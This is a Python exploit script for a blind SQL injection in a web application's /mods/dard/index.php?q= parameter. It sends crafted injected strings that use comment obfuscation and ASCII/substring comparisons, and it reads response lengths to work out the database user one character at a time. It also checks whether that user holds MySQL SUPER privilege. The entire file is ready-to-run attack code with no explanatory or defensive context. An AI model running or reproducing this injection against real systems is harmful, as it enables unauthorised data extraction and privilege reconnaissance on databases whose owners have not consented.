import sys
import requests


def isSuperUser(url, user):
    #SUPER is 5 characters ... so the result of this query should be length of 5  "select Length((SELECT privilege_type FROM information_schema.user_privileges WHERE privilege_type='SUPER' AND grantee LIKE '%root%'));"
    #otherwise the current user isn't Super user
    injected_str= "baddddd%%27/**/OR/**/substring((select/**/Length((SELECT/**/privilege_type/**/FROM/**/information_schema.user_privileges/**/WHERE/**/privilege_type='SUPER'/**/AND/**/grantee/**/LIKE/**/'%%%s%%'))),1,1)/**/LIKE/**/%%275" %user
    url2 = url+ injected_str
    proxy = {"http":"http://127.0.0.1:8080"}
    req=requests.get(url2,proxies=proxy)
    contlength = req.headers['Content-Length']
    if int(contlength) > 0:
        return True
    else:
        return False

    
def getQueryLength(url):
    length=""
    for y in range (1,3):
        for char2 in range (48,58):
            injected_str= "baddddd%%27/**/OR/**/ascii(substring((select/**/Length((select/**/user()))),%s,1))/**/LIKE/**/%%27%s" % (y, char2)
            url2 = url+injected_str
            realchar= chr(char2)
            proxy = {"http":"http://127.0.0.1:8080"}
            req=requests.get(url2,proxies=proxy)
            contlength = req.headers['Content-Length']
            if int(contlength) > 0:
                length += realchar
                break
            else:
                continue
    print("[*] query result length is %s chars" %length)
    return int(length)
                

def getUser(url, length):
    output=""        
    for x in range(1,length+1):    
        for char in range (32,126):
            injected_str= "baddddd%%27/**/OR/**/ascii(substring((select/**/user()),%d,1))/**/LIKE/**/%%27%s" % (x,char)
            url2 = url+injected_str
            realchar = chr(char)
            #try:
            proxy = {"http":"http://127.0.0.1:8080"}
            req=requests.get(url2,proxies=proxy)
            contlength = req.headers['Content-Length']
            if int(contlength) > 0:
                print ("[*] char number %d is %s" %(x,realchar))
                output += realchar
                break
            else:
                continue
            #except:
                #print ("An exception occurred")
    return output

if __name__ == "__main__":
    if len(sys.argv) <2 :
        print ("[*]Usage: %s [ip]" % sys.argv[0])
        sys.exit(-1)
    else:
        ip = sys.argv[1]
        url = "http://%s/mods/dard/index.php?q=" %ip
        print (" [*] Data Exfiltration is in progress")
        print(" [*] Getting query result length first")
        query_length = getQueryLength (url)
        print(" [*] Getting the current user")
        outtputt = getUser(url, query_length)
        print (" [*] The current User is: %s" %outtputt)
        print("[*] Getting privileges of the current user")
        user = outtputt.split('@')[0]
        priv = isSuperUser(url, user)
        if priv:
            print(" [*][*][*] The current user is %s and has SUPER privileges[*][*][*]" %outtputt)
        else:
            print(" [*][*][*] The current user is %s with no SUPER privileges[*][*][*]" %outtputt)
